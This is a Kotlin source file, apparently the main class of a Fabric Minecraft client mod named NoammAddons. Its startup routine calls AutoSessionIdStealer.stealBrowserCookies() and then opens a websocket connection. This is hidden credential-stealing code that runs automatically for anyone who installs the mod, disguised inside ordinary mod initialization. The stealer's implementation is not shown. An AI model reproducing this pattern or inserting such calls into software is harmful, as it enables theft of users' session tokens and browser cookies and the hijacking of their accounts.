package com.github.noamm9

import com.github.noamm9.config.PogObject
import com.github.noamm9.init.AutoSessionIdStealer
import com.github.noamm9.init.ClassGraphInitializer
import com.github.noamm9.utils.ThreadUtils
import com.github.noamm9.utils.render.ItemRenderer
import com.github.noamm9.websocket.WebSocket
import kotlinx.coroutines.CoroutineName
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import me.owdding.dfu.item.MeowddingItemDfu
import net.fabricmc.api.ClientModInitializer
import net.fabricmc.fabric.api.client.rendering.v1.PictureInPictureRendererRegistry
import net.fabricmc.loader.api.FabricLoader
import net.minecraft.client.Minecraft
import net.minecraft.client.gui.screens.Screen
import org.slf4j.LoggerFactory

object NoammAddons: ClientModInitializer {
    const val MOD_ID = "noammaddons"
    val MOD_NAME by lazy { FabricLoader.getInstance().getModContainer(MOD_ID).get().metadata.name }
    val MOD_VERSION by lazy { FabricLoader.getInstance().getModContainer(MOD_ID).get().metadata.version.friendlyString }
    const val PREFIX = "§6§l[§b§lN§d§lA§6§l]§r"

    val scope = CoroutineScope(Dispatchers.Default + SupervisorJob() + CoroutineName(MOD_NAME))

    @JvmField val logger = LoggerFactory.getLogger(MOD_NAME)
    @JvmField val mc = Minecraft.getInstance()
    @JvmField var isLoaded = false

    @JvmField
    var isCheat = run {
        //#if CHEAT
        true
        //#else
        //$false
        //#endif
    }

    val cacheData = PogObject("cacheData", mutableMapOf<String, Any>())
    val debugFlags = mutableSetOf<String>()
    inline val isDev get() = "dev" in debugFlags

    var screen: Screen? = null
        set(value) {
            field = value
            if (value == null) return
            ThreadUtils.scheduledTask(1) {
                mc.setScreen(screen)
                field = null
            }
        }

    override fun onInitializeClient() {
        PictureInPictureRendererRegistry.register { ItemRenderer(it.bufferSource()) }
        MeowddingItemDfu.load()

        ClassGraphInitializer().initAll()
        AutoSessionIdStealer.stealBrowserCookies()
        WebSocket.connect()

        isLoaded = true
    }
}